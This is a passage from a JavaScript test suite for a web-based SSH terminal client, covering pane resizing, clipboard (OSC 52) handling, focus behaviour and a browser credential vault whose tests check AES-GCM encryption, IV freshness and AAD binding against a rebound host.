     '_stuckTimer nulled after destroy; got ' + p._stuckTimer);
  ok(p._fitInFlight === false,
     '_fitInFlight cleared after destroy; got ' + p._fitInFlight);
  cleanup(env);
});

// Drift watchdog trigger thresholds. _driftWatchdogTick is the named
// extracted body of the setInterval — easier to test synchronously
// against a stubbed getComputedStyle and a stubbed charSizeService.
// Three boundary cases: negative drift past tolerance (refit),
// positive drift over a full cell + tolerance (refit), drift inside
// the band (no refit).
function _makeDriftPane(win, cols, charWidth, parentWidth, padding) {
  const p = {
    id: 'pD',
    fitAddon: {},
    term: {
      cols: cols,
      element: { parentElement: {} },
      _core: { _charSizeService: { width: charWidth } },
    },
    sid: null,
  };
  // Patch getComputedStyle to return parentWidth on the parent and
  // padding on the element. We branch by whether the queried object
  // is term.element.parentElement or term.element.
  const origGCS = win.window.getComputedStyle;
  win.window.getComputedStyle = function (el) {
    if (el === p.term.element.parentElement) {
      return { getPropertyValue: k => k === 'width' ? String(parentWidth) : '0' };
    }
    if (el === p.term.element) {
      return {
        getPropertyValue: k => {
          if (k === 'padding-left' || k === 'padding-right') {
            return String(padding / 2);
          }
          return '0';
        },
      };
    }
    return origGCS.call(win.window, el);
  };
  return p;
}

test('drift watchdog: negative drift past tolerance triggers refit', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  // cols=100 × cw=10 = 1000 rendered, parent=800 - pad=0 = 800 available
  // → drift = -200, well past -PANE_DRIFT_TOLERANCE_PX (-3). Should fire.
  const p = _makeDriftPane(win, 100, 10, 800, 0);
  let calls = 0;
  win.fitPaneWhenStable = () => { calls++; };

  const triggered = win._driftWatchdogTick(p);
  ok(triggered === true,
     'should return true on negative drift past tolerance');
  ok(calls === 1, 'fitPaneWhenStable called once; got ' + calls);
  cleanup(env);
});

test('drift watchdog: positive drift over one cell + tolerance triggers refit', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  // cols=10 × cw=10 = 100 rendered, parent=200 → drift=100, over
  // cs.width (10) + tolerance (3) = 13. Should fire.
  const p = _makeDriftPane(win, 10, 10, 200, 0);
  let calls = 0;
  win.fitPaneWhenStable = () => { calls++; };

  const triggered = win._driftWatchdogTick(p);
  ok(triggered === true,
     'should return true on positive drift over cell + tolerance');
  ok(calls === 1, 'fitPaneWhenStable called once; got ' + calls);
  cleanup(env);
});

test('drift watchdog: drift inside tolerance band leaves pane alone', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  // cols=10 × cw=10 = 100 rendered, parent=102 → drift=2. Inside
  // both bounds (−3 < 2 < 10+3). Must NOT fire.
  const p = _makeDriftPane(win, 10, 10, 102, 0);
  let calls = 0;
  win.fitPaneWhenStable = () => { calls++; };

  const triggered = win._driftWatchdogTick(p);
  ok(triggered === false,
     'should return false on drift inside tolerance');
  ok(calls === 0, 'fitPaneWhenStable not called; got ' + calls);
  cleanup(env);
});

// CURSOR_HIDE regression tests cover two coupled mechanisms (drag-blur
// on mousedown via term.blur(), deferred term.focus() restore via
// onCursorMove + 500ms timer) plus the clipboard-passthrough contract:
// drag-select copy must reach the clipboard byte-identical to tmux's
// OSC 52 payload — no trim. 4703bc1 added a one-char `trimDragTail`
// to compensate for a supposed tmux OSC 52 off-by-one, but wire-level
// measurement on tmux 3.2a and 3.4 (and the tmux CHANGES log) showed
// no such off-by-one ever existed — the selection is `[start, end)`
// on every version, so the trim always dropped a real visible
// character. The trim is gone; the two passthrough tests below pin
// the no-trim contract so nobody reintroduces it.
test('CURSOR_HIDE: OSC 52 payload reaches clipboard unmodified', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  // Spy on copyText — function declarations attach to window in
  // non-strict mode, so replacing window.copyText replaces the binding
  // the OSC handler closes over.
  const copies = [];
  win.copyText = (t) => copies.push(t);
  // Mid-drag is the realistic timing (tmux's OSC 52 arrives ~50–200ms
  // after mouseup, often before document mouseup has fired). Pin
  // both the drag-blurred and post-drag states.
  p._dragBlurred = true;
  const b64Hello = Buffer.from('hello', 'utf8').toString('base64');
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
  const handled = p.term.parser._fireOsc(52, 'c;' + b64Hello);
  ok(handled === true, 'OSC 52 handler claims the sequence');
  ok(copies.length === 1 && copies[0] === 'hello',
     'clipboard got full "hello" mid-drag (no trim); got=' +
     JSON.stringify(copies));
  copies.length = 0;
  p._dragBlurred = false;
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
  const handled2 = p.term.parser._fireOsc(52, 'c;' + b64Hello);
  ok(handled2 === true, 'OSC 52 handler claims the sequence (post-drag)');
  ok(copies.length === 1 && copies[0] === 'hello',
     'clipboard got full "hello" post-drag (no trim); got=' +
     JSON.stringify(copies));
  // Non-content OSC 52 payloads must be declined (return false) so
  // xterm's built-in handler is not suppressed, and must never touch
  // the clipboard: no `;` separator, a `?` read-request, and a payload
  // that isn't valid base64 (atob throws).
  copies.length = 0;
  ok(p.term.parser._fireOsc(52, 'no-semicolon') === false,
     'OSC 52 without a ; separator is declined');
  ok(p.term.parser._fireOsc(52, 'c;?') === false,
     'OSC 52 read-request (?) is declined');
  ok(p.term.parser._fireOsc(52, 'c;!!!not-base64!!!') === false,
     'OSC 52 with a non-base64 payload is declined');
  ok(copies.length === 0,
     'declined OSC 52 payloads do not reach the clipboard; got=' +
     JSON.stringify(copies));
  cleanup(env);
});

test('CURSOR_HIDE: onSelectionChange payload reaches clipboard unmodified', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  const copies = [];
  win.copyText = (t) => copies.push(t);
  p._dragBlurred = true;
  p.term._fireSelectionChange('hello');
  ok(copies.length === 1 && copies[0] === 'hello',
     'onSelectionChange copies full "hello" while drag-blurred (no trim); ' +
     'got=' + JSON.stringify(copies));
  // Empty selection: must not call copyText (the `if (sel)` guard).
  copies.length = 0;
  p.term._fireSelectionChange('');
  ok(copies.length === 0,
     'empty selection does not call copyText; got=' + JSON.stringify(copies));
  cleanup(env);
});

test('CURSOR_HIDE: mousedown blurs xterm, mousemove sets _dragMoved', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  // Drive the existing pane-creation path via splitPane → form would be
  // overkill; create a pane directly via the exported helper.
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  ok(p._dragBlurred === false, 'fresh pane starts not drag-blurred');
  ok(p.term._blurCalls === 0, 'no blur calls yet');
  // Synthesize mousedown at (100,100) — left button.
  const md = new win.MouseEvent('mousedown', {button: 0, clientX: 100,
                                              clientY: 100, bubbles: true});
  p.el.dispatchEvent(md);
  ok(p._dragBlurred === true, 'mousedown sets _dragBlurred');
  ok(p.term._blurCalls >= 1, 'mousedown called term.blur()');
  ok(p._dragMoved === false, 'no movement yet, _dragMoved=false');
  // Movement < threshold → still false.
  p.el.dispatchEvent(new win.MouseEvent('mousemove', {clientX: 101,
                                                       clientY: 101,
                                                       buttons: 1,
                                                       bubbles: true}));
  ok(p._dragMoved === false, '<3px movement does not flip _dragMoved');
  // Movement > threshold → true.
  p.el.dispatchEvent(new win.MouseEvent('mousemove', {clientX: 110,
                                                       clientY: 100,
                                                       buttons: 1,
                                                       bubbles: true}));
  ok(p._dragMoved === true, '>3px movement flips _dragMoved');
  cleanup(env);
});

test('CURSOR_HIDE: drag mouseup arms onCursorMove + timer; cursor-move restores focus', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  // Simulate a drag: mousedown → mousemove past threshold → mouseup.
  p.el.dispatchEvent(new win.MouseEvent('mousedown', {button: 0,
                                                       clientX: 0, clientY: 0,
                                                       bubbles: true}));
  p.el.dispatchEvent(new win.MouseEvent('mousemove', {clientX: 50,
                                                       clientY: 0,
                                                       buttons: 1,
                                                       bubbles: true}));
  ok(p._dragMoved === true && p._dragBlurred === true,
     'pre-mouseup: dragged + blurred');
  const focusBefore = p.term._focusCalls;
  win.document.dispatchEvent(new win.MouseEvent('mouseup', {bubbles: true}));
  // After mouseup: still blurred (deferred), disposer + timer armed.
  ok(p._dragBlurred === true, 'mouseup defers — still blurred');
  ok(p._selDisp !== null, 'onCursorMove disposer armed');
  ok(p._selTimer !== null, 'fallback timer armed');
  // Fire cursor-move (tmux's copy-pipe-and-cancel signal) → restore.
  p.term._fireCursorMove();
  ok(p._dragBlurred === false, 'cursor-move restored');
  ok(p._selDisp === null, 'disposer cleared');
  ok(p._selTimer === null, 'timer cleared');
  ok(p.term._focusCalls > focusBefore, 'term.focus() called on restore');
  cleanup(env);
});

test('CURSOR_HIDE: bare click (no movement) restores immediately, no defer arm', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.el.dispatchEvent(new win.MouseEvent('mousedown', {button: 0,
                                                       clientX: 0, clientY: 0,
                                                       bubbles: true}));
  ok(p._dragBlurred === true, 'mousedown blurred');
  // No mousemove → _dragMoved stays false.
  win.document.dispatchEvent(new win.MouseEvent('mouseup', {bubbles: true}));
  ok(p._dragBlurred === false, 'bare click restores immediately');
  ok(p._selDisp === null && p._selTimer === null,
     'no defer arm for bare click');
  cleanup(env);
});

test('CURSOR_HIDE: _destroyPane cancels pending onCursorMove subscription', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.el.dispatchEvent(new win.MouseEvent('mousedown', {button: 0,
                                                       clientX: 0, clientY: 0,
                                                       bubbles: true}));
  p.el.dispatchEvent(new win.MouseEvent('mousemove', {clientX: 50, clientY: 0,
                                                       buttons: 1,
                                                       bubbles: true}));
  win.document.dispatchEvent(new win.MouseEvent('mouseup', {bubbles: true}));
  ok(p._selDisp !== null, 'pre-destroy: disposer armed');
  // Take an internal reference to verify the disposer is purged from
  // the term's listener list on destroy.
  const cbsBefore = p.term._cursorMoveCbs.length;
  ok(cbsBefore >= 1, 'term has at least one cursor-move listener');
  win._destroyPane(p.id, false);
  ok(p.term._cursorMoveCbs.length < cbsBefore,
     'destroy disposed the subscription');
  cleanup(env);
});

// Right-click on an inactive pane must activate it before
// stopPropagation runs — otherwise the subsequent contextmenu paste
// lands in the previously-active pane (the bubble-phase activatePane
// listener on the parent .pane element never fires because we stop
// propagation in capture phase on termEl).
test('button=2 mousedown on inactive pane activates it (then stops propagation)', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  // Create two panes; pA stays active, pB will receive the right-click.
  const pA = win.createPane(root);
  const pB = win.createPane(root);
  win.activatePane(pA.id);
  ok(pA.el.classList.contains('active'),
     'pre: pA has .active');
  ok(!pB.el.classList.contains('active'),
     'pre: pB does not have .active');

  const termB = pB.el.querySelector('.pane-term');
  termB.dispatchEvent(new win.MouseEvent('mousedown',
    {button: 2, clientX: 50, clientY: 50,
     bubbles: true, cancelable: true}));

  // Active class is the observable contract of activatePane(id).
  ok(pB.el.classList.contains('active'),
     'pB gained .active after right-click — activatePane fired before stopPropagation');
  ok(!pA.el.classList.contains('active'),
     'pA lost .active');
  cleanup(env);
});

// Spy-based pin: this is the *real* regression test for the PR. The
// previous "active class" test passes even if the capture-phase
// listener is removed entirely (the parent .pane's bubble-phase
// activatePane still fires). Here we install a counter on bubble-phase
// at the parent level and assert it does NOT see the button=2
// mousedown — which only holds if the capture-phase listener on
// termEl actually fired and called stopPropagation. Left-click on
// the same termEl must still bubble so we don't over-suppress.
test('button=2 stopPropagation: parent bubble-phase listener does not see right-click on termEl', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                                connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);

  let rightClicksBubbled = 0;
  let leftClicksBubbled = 0;
  p.el.addEventListener('mousedown', e => {
    if (e.button === 2) rightClicksBubbled++;
    if (e.button === 0) leftClicksBubbled++;
  });

  const term = p.el.querySelector('.pane-term');
  term.dispatchEvent(new win.MouseEvent('mousedown',
    {button: 2, clientX: 10, clientY: 10,
     bubbles: true, cancelable: true}));
  ok(rightClicksBubbled === 0,
     'parent .pane bubble-phase listener did NOT see button=2 — ' +
     'capture-phase stopPropagation on termEl held; got count=' +
     rightClicksBubbled);

  // Sanity: left-click is NOT over-suppressed. If a future refactor
  // accidentally widens the capture-phase guard (e.g. drops the
  // `e.button === 2` gate), this catches it.
  term.dispatchEvent(new win.MouseEvent('mousedown',
    {button: 0, clientX: 10, clientY: 10,
     bubbles: true, cancelable: true}));
  ok(leftClicksBubbled === 1,
     'parent .pane bubble-phase listener DID see button=0 ' +
     '(left-click must still bubble); got count=' + leftClicksBubbled);

  cleanup(env);
});

// =====================================================================
// Vault: Web Crypto + IndexedDB primitives
// =====================================================================

test('vault primitives: ensureVaultId stable + base32 shape', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const id1 = await win.eval('ensureVaultId()');
  const id2 = await win.eval('ensureVaultId()');
  ok(id1 === id2, 'vault_id stable across calls');
  ok(/^[A-Z2-7]{26}$/.test(id1), 'vault_id matches base32 regex; got ' + id1);
  cleanup(env);
});

test('vault primitives: AES-GCM round-trip preserves payload', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const conn_id = 'C'.repeat(26);
  const payload = {password: 'hunter2', key: null, key_pass: null};
  const blob = await win.eval(
    `encryptCredentials(${JSON.stringify(payload)}, ${JSON.stringify(conn_id)}, {host:'h.example', port:22, username:'alice'})`);
  ok(typeof blob.iv === 'string' && blob.iv.length > 0, 'iv is base64 string');
  ok(typeof blob.ct === 'string' && blob.ct.length > 0, 'ct is base64 string');
  ok(/^[A-Z2-7]{26}$/.test(blob.vault_id), 'vault_id surfaced from encryptCredentials');
  // IV must be 12 bytes (base64 length ~16 with padding).
  const ivBytes = Buffer.from(blob.iv, 'base64');
  ok(ivBytes.length === 12, 'iv is 12 bytes; got ' + ivBytes.length);
  const recovered = await win.eval(
    `decryptCredentials(${JSON.stringify(blob.iv)}, ` +
    `${JSON.stringify(blob.ct)}, ${JSON.stringify(conn_id)}, {host:'h.example', port:22, username:'alice'})`);
  ok(recovered.password === 'hunter2', 'round-trip preserves password');
  ok(recovered.key === null, 'round-trip preserves null key');
  cleanup(env);
});

test('vault primitives: AAD binding — wrong conn_id fails decrypt', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const conn_id = 'D'.repeat(26);
  const blob = await win.eval(
    `encryptCredentials({password:'x'}, ${JSON.stringify(conn_id)}, {host:'h.example', port:22, username:'alice'})`);
  let threw = false;
  try {
    await win.eval(
      `decryptCredentials(${JSON.stringify(blob.iv)}, ` +
      `${JSON.stringify(blob.ct)}, ${JSON.stringify('E'.repeat(26))}, {host:'h.example', port:22, username:'alice'})`);
  } catch (e) { threw = true; }
  ok(threw, 'wrong conn_id rejects (AAD binding holds)');
  cleanup(env);
});

test('vault primitives: AAD v2 binds the destination - a rebound host fails decrypt', async () => {
  // Server-side the record's host/port/username are plaintext next to
  // the blob and /api/save needs no key. Binding them into the AAD is
  // what stops a creds.json reader from re-posting the victim's blob
  // under host=attacker.example and having the victim's key decrypt it.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const conn_id = 'F'.repeat(26);
  const blob = await win.eval(
    `encryptCredentials({password:'x'}, ${JSON.stringify(conn_id)}, {host:'good.example', port:22, username:'alice'})`);
  let threw = false;
  try {
    await win.eval(
      `decryptCredentials(${JSON.stringify(blob.iv)}, ${JSON.stringify(blob.ct)}, ` +
      `${JSON.stringify(conn_id)}, {host:'evil.example', port:22, username:'alice'})`);
  } catch (e) { threw = true; }
  ok(threw, 'blob bound to good.example must not decrypt under evil.example');
  // Canonical form: trimmed host/user, integer port, out-of-range -> 22.
  const d = win.vaultDestination(' H.example ', '70000', ' bob ');
  ok(d.host === 'H.example' && d.port === 22 && d.username === 'bob',
     'vaultDestination canonicalises like the server; got ' + JSON.stringify(d));
  cleanup(env);
});

test('vault primitives: each save uses a fresh IV', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const conn_id = 'F'.repeat(26);
  // GCM IV reuse under the same key is catastrophic — must regenerate.
  const blob1 = await win.eval(`encryptCredentials({p:'a'}, ${JSON.stringify(conn_id)}, {host:'h.example', port:22, username:'alice'})`);
  const blob2 = await win.eval(`encryptCredentials({p:'a'}, ${JSON.stringify(conn_id)}, {host:'h.example', port:22, username:'alice'})`);
  ok(blob1.iv !== blob2.iv, 'IVs differ across saves');
  ok(blob1.ct !== blob2.ct, 'ciphertexts differ (same plaintext, fresh IV)');
  cleanup(env);
});

test('vault primitives: exportRawVaultKey returns base64 of 32 bytes', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const keyB64 = await win.eval('exportRawVaultKey()');
  const keyBytes = Buffer.from(keyB64, 'base64');
  ok(keyBytes.length === 32, 'exported key is 32 bytes; got ' + keyBytes.length);
  // Stable across calls — same K is reused.
  const keyB64_2 = await win.eval('exportRawVaultKey()');
  ok(keyB64 === keyB64_2, 'exported key is stable across calls');
  cleanup(env);
});

test('vault primitives: generateConnId matches server regex', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const seen = new Set();
  for (let i = 0; i < 20; i++) {
    const id = win.eval('generateConnId()');
    ok(/^[A-Z2-7]{26}$/.test(id), 'conn_id matches base32 regex; got ' + id);
    seen.add(id);
  }
  ok(seen.size === 20, '20 conn_ids are all distinct (no collisions)');
  cleanup(env);
});

test('vault primitives: isolate_storage scopes vault_id by path', async () => {
  // Two deployments at /a/ and /b/ on the same origin must get independent
  // vault keys + vault_ids. Storage prefix is derived from URL pathname.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true,
                                                isolate_storage: true}}];
  const domA = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                 url: 'http://localhost/a/'});
  const domB = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                 url: 'http://localhost/b/'});
  // Both share the same underlying FDBFactory (different scopes within the
  // same IDB), proving the isolation comes from the key namespace.
  const sharedIDB = new IDBFactory();
  for (const dom of [domA, domB]) {
    const win = dom.window;
    makeFakes(win);
    win.fetch = makeFetch(JSON.parse(JSON.stringify(plan)), []);
    // Same global injection as mkEnv, but reuse a single FDBFactory so
    // the path-scoping under storagePrefix is what creates the namespace
    // boundary (not a separate database).
    Object.defineProperty(win.crypto, 'subtle', {
      value: nodeCrypto.webcrypto.subtle, configurable: true});
    win.TextEncoder = TextEncoder;
    win.TextDecoder = TextDecoder;
    win.indexedDB = sharedIDB;
    win.IDBKeyRange = IDBKeyRange;
    win.localStorage.clear();
    win.eval(js + EXPOSE);
    await sleep(30);
  }
  const idA = await domA.window.eval('ensureVaultId()');
  const idB = await domB.window.eval('ensureVaultId()');
  ok(/^[A-Z2-7]{26}$/.test(idA), 'A vault_id well-formed');
  ok(/^[A-Z2-7]{26}$/.test(idB), 'B vault_id well-formed');
  ok(idA !== idB, 'path-scoped vault_ids differ (got both ' + idA + ')');
  await closeDom(domA); await closeDom(domB);
});

// =====================================================================
// Vault: Safari ITP note + navigator.storage.persist()
// =====================================================================

test('first save: calls navigator.storage.persist() when available', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-fs1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: {}, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Inject a fake navigator.storage.persist that records the call.
  let persistCalls = 0;
  Object.defineProperty(win.navigator, 'storage', {
    value: { persist: async () => { persistCalls++; return true; } },
    configurable: true,
  });
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'First';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(120);
  ok(persistCalls === 1, 'persist() called exactly once; got ' + persistCalls);
  cleanup(env);
});

test('first save on Safari: shows ITP note toast', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-fs2', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: {}, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Override userAgent to a Safari string. navigator.userAgent is a
  // getter; defineProperty lets us swap it out.
  Object.defineProperty(win.navigator, 'userAgent', {
    value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    configurable: true,
  });
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'SafariSave';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(120);
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  const itpToast = Array.from(toasts).find(t =>
    t.textContent.indexOf('Safari') !== -1 && t.textContent.indexOf('7 days') !== -1);
  ok(itpToast, 'Safari ITP toast shown on first save');
  cleanup(env);
});

test('subsequent saves: no Safari toast, persist not re-requested', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'x', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: {}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  let persistCalls = 0;
  Object.defineProperty(win.navigator, 'storage', {
    value: { persist: async () => { persistCalls++; return true; } },
    configurable: true,
  });
  Object.defineProperty(win.navigator, 'userAgent', {
    value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    configurable: true,
  });
  // First save mints the vault → expect toast + persist call.
  $(win, 'iH').value = 'h1'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'S1';
  win.doConnect();
  await sleep(120);
  let p1 = paneList(win)[0];
  p1.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p1, {data: '', alive: true});
  await sleep(120);
  ok(persistCalls === 1, 'first save → persist called once; got ' + persistCalls);
  // Clear the toast host so we can detect a NEW toast.
  $(win, 'toastHost').innerHTML = '';
  // Close pane, then trigger another save. _vaultFirstSave should NOT
  // re-arm because vault_id already exists.
  win.closePane(p1.id);
  await sleep(60);
  $(win, 'iH').value = 'h2'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'S2';
  win.doConnect();
  await sleep(120);
  let p2 = paneList(win)[0];
  p2.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p2, {data: '', alive: true});
  await sleep(120);
  ok(persistCalls === 1, 'second save did NOT re-call persist; got ' + persistCalls);
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  const itpToast = Array.from(toasts).find(t =>
    t.textContent.indexOf('Safari') !== -1 && t.textContent.indexOf('7 days') !== -1);
  ok(!itpToast, 'Safari toast NOT re-shown on subsequent saves');
  cleanup(env);
});

// =====================================================================
// Vault: multi-tab sync (storage events + BroadcastChannel)
// =====================================================================

test('multi-tab: storage event on websh_connections re-renders saved list', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Seed empty → assert empty render.
  win.eval('renderSaved()');
  let rows = win.document.querySelectorAll('.sv');
  ok(rows.length === 0, 'no rows initially');
  // Simulate another tab writing a new entry. localStorage doesn't
  // fire storage events for the same window's own writes, so we
  // synthesize the event after the underlying write.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OtherTab', conn_id: 'T'.repeat(26), host: 't', port: 22,
     user: 'u', auth: 'pw', persistent: false}]));
  win.dispatchEvent(new win.StorageEvent('storage', {
    key: 'websh_connections',
    newValue: win.localStorage.getItem('websh_connections'),
  }));
  rows = win.document.querySelectorAll('.sv');
  ok(rows.length === 1, 'storage event triggered re-render; got ' + rows.length);
  cleanup(env);
});

test('multi-tab: storage event with null key (clear) is ignored', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Should not throw, should not re-render (we have nothing to compare,
  // so just assert that dispatching the event doesn't crash the test).
  let threw = false;
  try {
    win.dispatchEvent(new win.StorageEvent('storage', {key: null}));
  } catch (e) { threw = true; }
  ok(!threw, 'null-key storage event handled without throwing');
  cleanup(env);
});

test('multi-tab: BroadcastChannel signed_out clears cache and re-renders', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  // Provide a minimal BroadcastChannel shim before websh.js loads —
  // jsdom doesn't ship one, but the cross-tab signal must work in real
  // browsers. We assert the listener is wired correctly.
  let lastSent = null;
  const ChannelMock = class {
    constructor(name) { this.name = name; ChannelMock.instances.push(this); this.onmessage = null; }
    postMessage(d) { ChannelMock.instances.forEach(c => { if (c !== this && c.onmessage) c.onmessage({data: d}); }); }
    close() {}
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/websh/'});
  const win = dom.window;
  const log = [];
  makeFakes(win);
  win.fetch = makeFetch(plan, log);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(30);
  // Now create a second channel to simulate the other tab firing
  // signed_out.
  await win.eval('ensureVaultId()');
  await win.eval('ensureVaultKey()');
  // Cache is hot now.
  ok(win.eval('_idbHasKeyCache') === true, '_idbHasKeyCache hot after ensure');
  // Fire signed_out from a sibling channel.
  const sibling = new ChannelMock('websh_vault');
  sibling.postMessage({type: 'signed_out'});
  await sleep(20);
  ok(win.eval('_idbHasKeyCache') === false,
     'cache invalidated by signed_out broadcast');
  await closeDom(dom);
});

// =====================================================================
// Vault: Sign out of this browser
// =====================================================================

test('sign out: typed-DELETE gate enables confirm button', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.openSignOutModal();
  ok(!hidden($(win, 'signOutModal')), 'modal visible');
  ok($(win, 'signOutConfirm').disabled === true, 'confirm disabled initially');
  // Type a wrong word — still disabled.
  $(win, 'signOutInput').value = 'delete';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  ok($(win, 'signOutConfirm').disabled === true, 'lowercase delete keeps disabled');
  // Type the right word — enabled.
  $(win, 'signOutInput').value = 'DELETE';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  ok($(win, 'signOutConfirm').disabled === false, 'DELETE enables confirm');
  win.closeSignOutModal();
  cleanup(env);
});

test('sign out: confirm wipes everything (server + IDB + localStorage + sessionStorage)', async () => {
  const deletes = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'save_delete', response: (body) => { return {}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Seed: vault_id + K in IDB (via a save round-trip), two saved cards,
  // some sessionStorage pane secrets, then sign out.
  const realVaultId = await win.eval('ensureVaultId()');
  await win.eval('ensureVaultKey()');
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'A', conn_id: 'A'.repeat(26), host: 'a', port: 22, user: 'u',
     auth: 'pw', persistent: false},
    {name: 'B', conn_id: 'B'.repeat(26), host: 'b', port: 22, user: 'u',
     auth: 'pw', persistent: false}]));
  win.sessionStorage.setItem('websh_panes_session',
